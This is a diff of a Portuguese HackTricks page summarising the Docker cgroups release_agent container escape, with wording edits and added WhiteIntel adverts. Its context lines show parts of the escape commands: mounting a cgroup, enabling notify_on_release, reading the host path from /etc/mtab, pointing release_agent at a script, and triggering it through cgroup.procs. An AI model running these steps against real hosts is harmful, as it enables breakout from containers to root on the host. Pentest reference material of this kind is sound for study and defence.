@@ -1,4 +1,4 @@
-# Docker release\_agent cgroups escape
+# Docker escape de cgroups do release\_agent
 
 <details>
 
@@ -7,13 +7,26 @@
 Outras maneiras de apoiar o HackTricks:
 
 * Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
+## WhiteIntel
+
+<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+
+[**WhiteIntel**](https://whiteintel.io) é um mecanismo de busca alimentado pela **dark web** que oferece funcionalidades **gratuitas** para verificar se uma empresa ou seus clientes foram **comprometidos** por **malwares de roubo**.
+
+O objetivo principal do WhiteIntel é combater tomadas de conta e ataques de ransomware resultantes de malwares de roubo de informações.
+
+Você pode verificar o site deles e experimentar o mecanismo gratuitamente em:
+
+{% embed url="https://whiteintel.io" %}
+
+---
 
 **Para mais detalhes, consulte o [post original do blog](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Este é apenas um resumo:
 
@@ -40,7 +53,7 @@ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
 3. **Configurar o Agente de Liberação:**
-   - O caminho do contêiner no host é obtido a partir do arquivo /etc/mtab.
+   - O caminho do contêiner no host é obtido do arquivo /etc/mtab.
    - O arquivo release_agent do cgroup é então configurado para executar um script chamado /cmd localizado no caminho do host adquirido.
 ```shell
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
@@ -59,16 +72,28 @@ chmod a+x /cmd
 ```shell
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
+## WhiteIntel
+
+<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+
+[**WhiteIntel**](https://whiteintel.io) é um mecanismo de busca alimentado pela **dark web** que oferece funcionalidades **gratuitas** para verificar se uma empresa ou seus clientes foram **comprometidos** por **malwares ladrões**.
+
+O principal objetivo do WhiteIntel é combater invasões de contas e ataques de ransomware resultantes de malwares que roubam informações.
+
+Você pode acessar o site deles e experimentar o mecanismo gratuitamente em:
+
+{% embed url="https://whiteintel.io" %}
+
 <details>
 
 <summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
